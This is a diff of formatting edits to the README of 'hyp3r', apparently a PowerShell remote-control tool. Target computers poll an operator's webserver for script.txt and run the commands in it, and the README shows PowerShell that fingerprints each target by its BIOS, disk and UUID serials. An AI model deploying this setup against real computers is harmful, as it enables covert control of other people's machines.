@@ -39,7 +39,7 @@ cd hyp3r/
   - Copy the contents of the `apache` folder to your webserver's page folder.
   - Edit lines `2`, `3` and `4` inside `http.ps1` as follows: 
 
-        ```powershell
+        ```
 	
         $verurl = 'http://your_website_url_or_ip/script.txt'
         $url = 'http://your_website_url_or_ip'
@@ -57,8 +57,7 @@ cd hyp3r/
 
 #### To run commands on the target computer(s) open the file called `script.txt` inside your webserver's page folder and modify its contents
   - Example:
-
-        ```powershell
+        ```
         [System.Console]::Beep(1000,300)
         ```
 
@@ -68,13 +67,14 @@ cd hyp3r/
   - If you have multiple targets that listen to the same server the commands inside `script.txt` will be ran by all of the computers listening.
   - If you want to run a command only on one of the targets you will have to get a little creative:
 
-        ```powershell
+        ```
         if($env:COMPUTERNAME -eq "TARGET-PC") {
           echo "now it will only be executed by targets with the user TARGET-PC"
         }
         ```
   - If the COMPUTERNAME identifier is way to simple and it brings up problems you can use the scripts unique identifier composed of the biosid hddid and uuid of the target computer
-        ```powershell
+
+        ```
         $a=Get-WmiObject win32_bios | Format-List SerialNumber | out-string; $id_bios=$a.split(' ')[2].Trim(); #bios id
 	      $b=wmic diskdrive get serialnumber; $id_hdd=$b.split('\n')[2].Trim(); #hdd id
 	      $c=Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -Property UUID | out-string;$id_uuid=$c.split(' ')[64].Trim() #uuid
@@ -84,4 +84,6 @@ cd hyp3r/
         }
         ```
 
-  - You can get the UNIQUE_IDENTIFIER of a computer from the `data.txt` file inside the webserver's page folder: eg. `CND83492ZZ_69BCTDGFT_760BD1B8-5170-E821-A4C3-1063E5C2E22F`.
+
+  - You can get the UNIQUE_IDENTIFIER of a computer from the `data.txt` file inside the webserver's page folder: 
+  - eg. `CND83492ZZ_69BCTDGFT_760BD1B8-5170-E821-A4C3-1063E5C2E22F`.
